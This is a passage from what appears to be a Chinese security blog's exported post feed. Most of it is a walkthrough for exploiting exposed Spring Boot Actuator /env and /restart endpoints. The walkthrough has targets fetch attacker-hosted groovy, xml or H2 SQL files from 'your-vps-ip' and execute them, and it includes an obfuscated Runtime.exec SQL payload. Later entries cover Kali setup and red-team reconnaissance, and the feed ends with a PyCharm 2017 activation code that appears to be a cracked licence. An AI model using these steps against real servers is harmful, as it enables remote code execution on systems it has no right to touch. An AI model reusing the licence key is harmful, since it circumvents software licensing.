your-vps-ip</code></pre><h5 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedlogging.config=http://your-vps-ip/example.xml</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"logging.config","value":"http://your-vps-ip/example.xml"&#125;</code></pre><h5 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /restartContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/restartContent-Type: application/json</code></pre><h4 id="漏洞原理：-7"><a href="#漏洞原理：-7" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-8"><a href="#漏洞分析：-8" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p><p>​<a href="https://landgrey.me/blog/21/">https://landgrey.me/blog/21/</a></p><h4 id="漏洞环境：-8"><a href="#漏洞环境：-8" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9098/actuator/env</code></pre><h3 id="0x0B：restart-logging-config-groovy-RCE"><a href="#0x0B：restart-logging-config-groovy-RCE" class="headerlink" title="0x0B：restart logging.config groovy RCE"></a>0x0B：restart logging.config groovy RCE</h3><h4 id="利用条件：-14"><a href="#利用条件：-14" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h4 id="利用方法：-14"><a href="#利用方法：-14" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件"><a href="#步骤一：托管-groovy-文件" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><pre class="language-markup" data-language="markup"><code class="language-markup">Runtime.getRuntime().exec("open -a Calculator")</code></pre><h5 id="步骤二：设置-logging-config-属性"><a href="#步骤二：设置-logging-config-属性" class="headerlink" title="步骤二：设置 logging.config 属性"></a>步骤二：设置 logging.config 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedlogging.config=http://your-vps-ip/example.groovy</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"logging.config","value":"http://your-vps-ip/example.groovy"&#125;</code></pre><h5 id="步骤三：重启应用"><a href="#步骤三：重启应用" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /restartContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/restartContent-Type: application/json</code></pre><h4 id="漏洞原理：-8"><a href="#漏洞原理：-8" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li><li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-9"><a href="#漏洞环境：-9" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9098/actuator/env</code></pre><h3 id="0x0C：restart-spring-main-sources-groovy-RCE"><a href="#0x0C：restart-spring-main-sources-groovy-RCE" class="headerlink" title="0x0C：restart spring.main.sources groovy RCE"></a>0x0C：restart spring.main.sources groovy RCE</h3><h4 id="利用条件：-15"><a href="#利用条件：-15" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h4 id="利用方法：-15"><a href="#利用方法：-15" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件-1"><a href="#步骤一：托管-groovy-文件-1" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><pre class="language-markup" data-language="markup"><code class="language-markup">Runtime.getRuntime().exec("open -a Calculator")</code></pre><h5 id="步骤二：设置-spring-main-sources-属性"><a href="#步骤二：设置-spring-main-sources-属性" class="headerlink" title="步骤二：设置 spring.main.sources 属性"></a>步骤二：设置 spring.main.sources 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.main.sources=http://your-vps-ip/example.groovy</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.main.sources","value":"http://your-vps-ip/example.groovy"&#125;</code></pre><h5 id="步骤三：重启应用-1"><a href="#步骤三：重启应用-1" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /restartContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/restartContent-Type: application/json</code></pre><h4 id="漏洞原理：-9"><a href="#漏洞原理：-9" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot</code> 组件中的 <code>org.springframework.boot.BeanDefinitionLoader.java</code> 文件代码逻辑中会判断 url 是否以 <code>.groovy</code> 结尾</li><li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-10"><a href="#漏洞环境：-10" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9098/actuator/env</code></pre><h3 id="0x0D：restart-spring-datasource-data-h2-database-RCE"><a href="#0x0D：restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="0x0D：restart spring.datasource.data h2 database RCE"></a>0x0D：restart spring.datasource.data h2 database RCE</h3><h4 id="利用条件：-16"><a href="#利用条件：-16" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li></ul><h4 id="利用方法：-16"><a href="#利用方法：-16" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-sql-文件"><a href="#步骤一：托管-sql-文件" class="headerlink" title="步骤一：托管 sql 文件"></a>步骤一：托管 sql 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p></blockquote><pre class="language-markup" data-language="markup"><code class="language-markup">CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('/bin/bash','-c','open -a Calculator');</code></pre><h5 id="步骤二：设置-spring-datasource-data-属性"><a href="#步骤二：设置-spring-datasource-data-属性" class="headerlink" title="步骤二：设置 spring.datasource.data 属性"></a>步骤二：设置 spring.datasource.data 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.datasource.data=http://your-vps-ip/example.sql</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.datasource.data","value":"http://your-vps-ip/example.sql"&#125;</code></pre><h5 id="步骤三：重启应用-2"><a href="#步骤三：重启应用-2" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /restartContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/restartContent-Type: application/json</code></pre><h4 id="漏洞原理：-10"><a href="#漏洞原理：-10" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-11"><a href="#漏洞环境：-11" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9098/actuator/env</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinux基础配置</title>
      <link href="/linux/kalilinux-ji-chu-pei-zhi/"/>
      <url>/linux/kalilinux-ji-chu-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Kali修改系统语言"><a href="#Kali修改系统语言" class="headerlink" title="Kali修改系统语言"></a>Kali修改系统语言</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><hr><p>1.直接在终端命令<code>dpkg-reconfigure locales</code></p><p>2.然后按需选择支持字符编码：</p><ul><li>en_US.UTF-8（英文）</li><li>zh_CN.GBK（中文）</li><li>zh_CN.UTF-8（中文）</li></ul><p>（注：选择字符编码界面按空格键进行选择，按回车键进行确认）</p><ol start="3"><li>reboot重启即可</li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><hr><p>1.修改&#x2F;etc&#x2F;default&#x2F;locale文件</p><ul><li>echo LANG&#x3D;字符编码</li></ul><p>2.然后，reboot重启即可</p><h2 id="Kali更新apt源"><a href="#Kali更新apt源" class="headerlink" title="Kali更新apt源"></a>Kali更新apt源</h2><ol><li><code>vim /etc/apt/sources.list</code></li><li>将如下源地址写入<ul><li>中科大 <pre class="language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</code></pre></li><li>清华大学 <pre class="language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-freedeb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</code></pre></li></ul></li><li>写入保存后执行命令 <pre class="language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgradeapt-get cleanreboot</code></pre></li></ol><h2 id="Kali2020设置ROOT登录"><a href="#Kali2020设置ROOT登录" class="headerlink" title="Kali2020设置ROOT登录"></a>Kali2020设置ROOT登录</h2><ol><li><p>开启虚拟机，按E，进入如下界面<br><img src="https://gitee.com/amg4matic/picgo/raw/master/pic2/image-20210218105256404.png" alt="image-20210218105256404"></p></li><li><p>找到以<code>linux</code>开头的行，<strong>将ro改成rw</strong>, 在最后一行添加 <code>init=/bin/bash</code><br> <img src="https://gitee.com/amg4matic/picgo/raw/master/pic2/image-20210313004418464.png" alt="image-20210313004418464"></p></li><li><p>修改之后Ctrl+X进行boot，然后设置root密码之后重启即可<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210218105407711.png"></p></li><li><p>增删用户<br>增：adduser xxx<br>删：deluser xxx</p></li></ol><h2 id="设置永不锁屏"><a href="#设置永不锁屏" class="headerlink" title="设置永不锁屏"></a>设置永不锁屏</h2><blockquote><p>Kali Linux系统安装成功后，默认10分钟后将自动锁定屏幕。所以，如果10分钟内用户没有执行任何操作，将自动锁定屏幕。这样，当用户操作时，需要输入密码后才可以重新进入系统。为了避免受这些问题影响，可以设置永不锁定屏幕。设置方法如下所示：</p></blockquote><p>（1）在菜单栏中，依次选择“应用程序”|“设置”|“电源管理器”命令，打开Xfce电源管理器界面。<br>（2）单击“显示”选项卡，将所有选项值都设置为从不。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span class="token builtin class-name">echo</span> <span class="token string">'deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红蓝对抗之信息收集</title>
      <link href="/pentest/informationgather/"/>
      <url>/pentest/informationgather/</url>
      
        <content type="html"><![CDATA[<blockquote><p>信息收集作为红蓝对抗中第一步，起着非常重要的作用，本文将会对信息收集整个流程进行一个概述。</p></blockquote><h2 id="信息收集流程"><a href="#信息收集流程" class="headerlink" title="信息收集流程"></a>信息收集流程</h2><p>信息收集我们要收集哪些内容，我们如何判定我们收集到信息是准确的，一般来说我们要从以下几个维度进行</p><ol><li>厂商信息收集<ul><li>WHOIS信息收集</li><li>分支机构</li><li>域名备案</li><li>服务供应商</li><li>第三方厂商系统</li></ul></li><li>资产归属判定<ul><li>WHOIS</li><li>备案信息</li><li>域名证书</li><li>数字签名</li><li>logo</li><li>title</li></ul></li><li>资产收集维度<ul><li>Web应用、WAP</li><li>APP、PC客户端</li><li>微信公众号、微信小程序、支付宝小程序</li><li>QQ、钉钉、企业微信、微信群、QQ群</li></ul></li><li>资产收集内容<ul><li>子域名、IP、C段、旁站</li><li>Web路径、参数名、文件名、协议、数据包类型</li><li>邮箱、ID、用户名、密码、手机号、员工工号、重要系统密码规则</li><li>身份证号、企业资质证书、法人信息</li></ul></li></ol><h2 id="信息收集方法与实用工具"><a href="#信息收集方法与实用工具" class="headerlink" title="信息收集方法与实用工具"></a>信息收集方法与实用工具</h2><h3 id="厂商信息"><a href="#厂商信息" class="headerlink" title="厂商信息"></a>厂商信息</h3><p>在只有一个厂商名的情况下，一般来说我们首先要通过爱企查这种类型的网站去获取他的企业规模、投资关系、域名备案、专利、产品、高管等信息。<br>下面推荐四个常用来查询此类信息的网站：</p><ul><li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li></ul><p>爱企查是百度旗下的一个企业信息查询网站，优点是可以通过百度账号登陆，而且很多信息不需要VIP也可以查看。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210511165716.png" alt="20210511165716"></p><ul><li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>启信宝：<a href="https://www.qixin.com/">https://www.qixin.com/</a></li></ul><p>这类网站的信息基本上大同小异，推荐使用爱企查和小蓝本，整体使用体验比后面两个要好上一些。</p><h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>现在做红蓝对抗很多情况下只要备案归属是某厂商的话，这个资产就算是该厂商的，因此可以从备案信息也查询到一些可能的三不管资产。</p><p>下面给出三个比较好用的网站：</p><ul><li>工信部平台：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210514111833.png" alt="20210514111833"><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210514111925.png" alt="20210514111925"></li><li>站长之家(收费)：<a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></li></ul><h3 id="子域名和IP资产收集"><a href="#子域名和IP资产收集" class="headerlink" title="子域名和IP资产收集"></a>子域名和IP资产收集</h3><p>通过上述的厂商信息、备案信息收集，已经可以基础的获取一些域名信息，此时就进入了下一个步骤，子域名和IP资产的收集。</p><h4 id="浏览器搜索"><a href="#浏览器搜索" class="headerlink" title="浏览器搜索"></a>浏览器搜索</h4><p>通过浏览器自带的搜索语法去获取子域名，也是大家熟知的Google Hacking<br>部分搜索语法如下：</p><ul><li>site: *.target.com</li><li>inurl: target</li><li>intitle: target</li></ul><h4 id="空间测绘引擎搜索"><a href="#空间测绘引擎搜索" class="headerlink" title="空间测绘引擎搜索"></a>空间测绘引擎搜索</h4><p>国内资产优先使用<a href="https://fofa.so/">fofa</a>、<a href="https://www.zoomeye.org/">zoomeye</a></p><p>国外资产优先使用<a href="https://www.shodan.io/">shodan</a></p><p>大部分情况，用fofa就够了，推荐有能力的就充一个高级会员，这里推荐一个由<a href="https://c.wgpsec.org/">Wgpsec</a>开发的fofa信息采集工具，[fofa_viewer]</p><h4 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h4><p><a href="https://securitytrails.com/">https://securitytrails.com/</a></p><h4 id="百度网盘搜索"><a href="#百度网盘搜索" class="headerlink" title="百度网盘搜索"></a>百度网盘搜索</h4><p><a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><h3 id="代码托管平台信息泄漏"><a href="#代码托管平台信息泄漏" class="headerlink" title="代码托管平台信息泄漏"></a>代码托管平台信息泄漏</h3><h4 id="gitrecon-Github个人信息"><a href="#gitrecon-Github个人信息" class="headerlink" title="gitrecon-Github个人信息"></a>gitrecon-Github个人信息</h4><blockquote><p>OSINT tool to get information from a Github or Gitlab profile and find user’s email addresses leaked on commits.</p></blockquote><p>项目地址：<a href="https://github.com/GONZOsint/gitrecon">https://github.com/GONZOsint/gitrecon</a><br>使用说明：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gitrecon.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token parameter variable">-s</span> <span class="token punctuation">&#123;</span>github,gitlab<span class="token punctuation">&#125;</span> <span class="token punctuation">[</span>-a<span class="token punctuation">]</span> <span class="token punctuation">[</span>-o<span class="token punctuation">]</span> username参数说明:<span class="token parameter variable">-h</span> 可选，显示帮助<span class="token parameter variable">-s</span> <span class="token punctuation">&#123;</span>github,gitlab<span class="token punctuation">&#125;</span> 必选，选择需要获取用户信息的站 点<span class="token parameter variable">-a</span> 可选，下载用户头像<span class="token parameter variable">-o</span> 可选，将用户信息保存至/results/username 目录下</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210512173745.png" alt="20210512173745"></p>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm2017</title>
      <link href="/python/pycharm2017-ji-huo-ma/"/>
      <url>/python/pycharm2017-ji-huo-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="Pycharm-2017-Registe-Code"><a href="#Pycharm-2017-Registe-Code" class="headerlink" title="Pycharm 2017 Registe Code"></a>Pycharm 2017 Registe Code</h2><pre class="language-none"><code class="language-none">BIG3CLIK6F-eyJsaWNlbnNlSWQiOiJCSUczQ0xJSzZGIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiQUMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IklJIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiV1MiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEUE4iLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJSQyIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEQiIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlJNIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUEMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9XSwiaGFzaCI6IjQ3NzU1MTcvMCIsImdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ&#x3D;&#x3D;-iygsIMXTVeSyYkUxAqpHmymrgwN5InkOfeRhhPIPa88FO9FRuZosIBTY18tflChACznk3qferT7iMGKm7pumDTR4FbVVlK&#x2F;3n1ER0eMKu2NcaXb7m10xT6kLW1Xb3LtuZEnuis5pYuEwT1zR7GskeNWdYZ0dAJpNDLFrqPyAPo5s1KLDHKpw+VfVd4uf7RMjOIzuJhAAYAG+amyivQt61I9aYiwpHQvUphvTwi0X0qL&#x2F;oDJHAQbIv4Qwscyo4aYZJBKutYioZH9rgOP6Yw&#x2F;sCltpoPWlJtDOcw&#x2F;iEWYiCVG1pH9AWjCYXZ9AbbEBOWV71IQr5VWrsqFZ7cg7hLEJ3A&#x3D;&#x3D;-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO&#x2F;5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij&#x2F;78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB&#x2F;xVy&#x2F;VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE&#x2F;EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl&#x2F;GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4&#x2F;+wuC5EtZBfvdl4HT&#x2F;8vzMW&#x2F;oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c&#x2F;F4tlK&#x2F;DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr&#x2F;OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek&#x2F;Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f&#x2F;qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa&#x2F;cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog&#x3D;&#x3D;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
